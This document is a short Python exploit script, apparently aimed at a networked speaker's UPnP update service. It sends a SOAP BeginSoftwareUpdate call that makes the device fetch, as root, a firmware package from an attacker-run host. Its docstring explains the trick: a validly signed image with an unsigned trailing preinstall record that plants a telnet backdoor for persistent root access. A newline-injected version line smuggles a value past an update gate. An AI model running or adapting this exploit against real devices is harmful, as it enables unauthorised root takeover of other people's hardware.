#!/usr/bin/env python3
"""Fire BeginSoftwareUpdate(URL=pwned-nodns.upd) on a 57.23 unit — NO DNS changes.

The package = the GENUINE signed 57.23-74170-1-16.upd (prefix byte-identical,
type-17 digest + signature both VALID per verify_upd.py) + a 237-byte trailing
type-3 preinstall record (the malleability foothold: bytes after type-17 are
outside the signature; first-wins version semantics keep the gate green).

BeginSoftwareUpdate(URL, Flags) writes /var/run/upgradeinfo and the unit's
/bin/upgrade fetches the URL as root. If the flasher honours a trailing
type-3 (the documented open question), the preinstall plants
/jffs/system/Configure.dev → telnetd 2323 at next boot → persistent root.
"""
import subprocess, sys, re, time

def soap(ip, action, extra, svc="urn:schemas-upnp-org:service:ZoneGroupTopology:1"):
    ctl = f"http://{ip}:1400/ZoneGroupTopology/Control"
    body = ('<?xml version="1.0"?><s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/" '
            's:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/"><s:Body>'
            f'<u:{action} xmlns:u="{svc}"><InstanceID>0</InstanceID>{extra}</u:{action}>'
            '</s:Body></s:Envelope>')
    r = subprocess.run(["curl","-s","-m","30","-X","POST","-H",'Content-Type: text/xml; charset="utf-8"',
                        "-H",f'SOAPACTION: "{svc}#{action}"',"--data-binary",body,ctl],
                       capture_output=True, text=True)
    return r.stdout

def main():
    ip = sys.argv[1]
    url = sys.argv[2] if len(sys.argv) > 2 else "http://192.168.4.160:8899/pwned-nodns.upd"
    extra = "&#10;MinVersion: [57.16-41110]"   # LF-injected MinVersion line (2nd-gate satisfier)
    out = soap(ip, "BeginSoftwareUpdate",
               f"<UpdateURL>{url}</UpdateURL><Flags>1</Flags><ExtraOptions>{extra}</ExtraOptions>")
    if "UPnPError" in out:
        print("ERR:", out[:300])
    else:
        print("BSU fired:", out[:200])
        print("now watch: /tmp/q57-serve/http8899.log for the fetch + the unit's /status/upgradeinfo")

if __name__ == "__main__":
    main()
